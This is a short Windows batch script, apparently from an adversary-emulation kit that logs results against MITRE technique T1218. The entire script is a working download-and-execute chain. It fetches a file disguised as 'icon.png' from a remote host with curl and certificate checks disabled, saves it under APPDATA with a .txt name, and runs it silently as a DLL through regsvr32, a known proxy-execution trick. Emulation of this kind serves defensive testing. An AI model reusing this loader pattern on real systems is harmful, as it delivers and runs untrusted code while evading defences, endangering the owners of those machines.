@echo off
SETLOCAL EnableDelayedExpansion

REM Declare random-named SET variables for all PHR placeholders
SET xylgms=%APPDATA%\10622\6b90e621
SET qdrbpz=d70b1b16.txt
SET ukvnwt=https://10.0.0.49/stage/2/icon.png?10622-7
SET icjepf=BALAM-S2B
SET omhxbs=10622
SET rztlay=7
SET gcfqnu=%PUBLIC%\\macula-simulations.log

REM Cache timestamp for consistent logging
SET tsvar=%DATE%/%TIME%

REM Step 1: Heartbeat fetch (downloads the Loader DLL)
echo [!tsvar!][DEBUG][!icjepf!][!omhxbs!]: heartbeat_start>> "!gcfqnu!" 2>nul
curl -k -s -o "!xylgms!\!qdrbpz!" "!ukvnwt!"
echo [!tsvar!][DEBUG][!icjepf!][!omhxbs!]: heartbeat_complete>> "!gcfqnu!" 2>nul

REM Step 2: Change to output directory
echo [!tsvar!][DEBUG][!icjepf!][!omhxbs!]: chdir_start>> "!gcfqnu!" 2>nul
cd /d "!xylgms!" >nul 2>&1
SET chdircode=!errorlevel!
echo [!tsvar!][DEBUG][!icjepf!][!omhxbs!]: chdir_result=!chdircode!>> "!gcfqnu!" 2>nul

REM Step 3: LOLBIN invocation of the downloaded Loader DLL
if exist "!xylgms!\!qdrbpz!" (
    echo [!tsvar!][DEBUG][!icjepf!][!omhxbs!]: regsvr32_start>> "!gcfqnu!" 2>nul
    regsvr32.exe /s "!qdrbpz!"
    SET regcode=!errorlevel!
    echo [!tsvar!][DEBUG][!icjepf!][!omhxbs!]: regsvr32_result=!regcode!>> "!gcfqnu!" 2>nul

    if !regcode! equ 0 (
        echo [!tsvar!][TTP][!icjepf!][!omhxbs!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!gcfqnu!"
    ) else (
        echo [!tsvar!][TTP][!icjepf!][!omhxbs!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!gcfqnu!"
    )
) else (
    echo [!tsvar!][DEBUG][!icjepf!][!omhxbs!]: dll_missing>> "!gcfqnu!" 2>nul
)

ENDLOCAL